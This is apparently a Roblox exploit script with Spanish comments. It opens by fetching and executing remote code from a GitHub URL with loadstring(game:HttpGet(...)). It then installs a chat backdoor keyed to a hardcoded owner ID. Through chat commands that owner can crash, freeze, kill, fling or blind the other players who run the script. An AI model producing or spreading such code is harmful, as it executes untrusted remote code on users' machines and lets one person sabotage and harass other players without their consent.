loadstring(game:HttpGet("https://raw.githubusercontent.com/Troll-Hub/LonelySC/refs/heads/main/ssc"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Lighting = game:GetService("Lighting")

-- ID del dueÃ±o (tÃº, papi ğŸ‘‘)
local OWNER_ID = 2061467416

-- FunciÃ³n que se activa cuando el OWNER escribe cualquier comando
local function onOwnerCommand(message)
    local msg = message:lower()
    
    -- Si eres el OWNER â†’ CANCELAR TODO, nada se ejecuta
    if LocalPlayer.UserId == OWNER_ID then
        print("Cancelado para OWNER: " .. msg .. " (tÃº mandas, papi ğŸ˜)")
        return
    end
    
    -- Solo plebeyos (ID no coincide) sufren el efecto ğŸ˜ˆ
    print("Plebeyo " .. LocalPlayer.Name .. " sufriendo: " .. msg .. " ğŸ’¦")
    
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") or not character:FindFirstChild("Humanoid") then
        return
    end
    
    local humanoid = character.Humanoid
    local rootPart = character.HumanoidRootPart
    
    if msg == "/k" then
        -- Kick original: cierra el juego para este plebeyo
        game:Shutdown()
        print("Â¡Plebeyo kickeado! ğŸ’¥")
        
    elseif msg == "/fr" then
        -- Freeze
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = true
            end
        end
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        print("Â¡Congelado! â„ï¸")
        
    elseif msg == "/unfr" then
        -- Unfreeze
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = false
            end
        end
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        print("Â¡Descongelado! ğŸ”¥")
        
    elseif msg == "/r" then
        -- Reset
        humanoid.Health = 0
        print("Â¡Reseteado! ğŸ’€")
        
    elseif msg == "/f" then
        -- Fling
        rootPart.Velocity = Vector3.new(math.random(-200, 200), 150, math.random(-200, 200))
        print("Â¡Flingeado! ğŸš€")
        
    elseif msg == "/j" then
        -- Jump alto
        humanoid.JumpPower = 120
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        task.wait(0.2)
        humanoid.JumpPower = 50
        print("Â¡Salto forzado! ğŸ¦˜")
        
    elseif msg == "/l" then
        -- Efecto oscuro + ocultar nombres
        local originalFogEnd = Lighting.FogEnd
        local originalFogColor = Lighting.FogColor
        
        Lighting.FogEnd = 10
        Lighting.FogColor = Color3.new(0, 0, 0)
        
        -- Ocultar nombres localmente
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Head") then
                local billboard = plr.Character.Head:FindFirstChildOfClass("BillboardGui")
                if billboard then billboard.Enabled = false end
            end
        end
        
        print("Â¡Modo oscuridad activado! ğŸŒ‘")
        
        task.wait(10)
        
        -- Restaurar
        Lighting.FogEnd = originalFogEnd
        Lighting.FogColor = originalFogColor
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Head") then
                local billboard = plr.Character.Head:FindFirstChildOfClass("BillboardGui")
                if billboard then billboard.Enabled = true end
            end
        end
        print("Â¡Modo oscuridad desactivado! â˜€ï¸")
    end
end

-- Hookear el chat SOLO del OWNER en todos los clientes
local function hookOwnerChat(player)
    if player.UserId == OWNER_ID then
        player.Chatted:Connect(onOwnerCommand)
    end
end

-- Jugadores actuales
for _, player in ipairs(Players:GetPlayers()) do
    hookOwnerChat(player)
end

-- Nuevos jugadores
Players.PlayerAdded:Connect(hookOwnerChat)
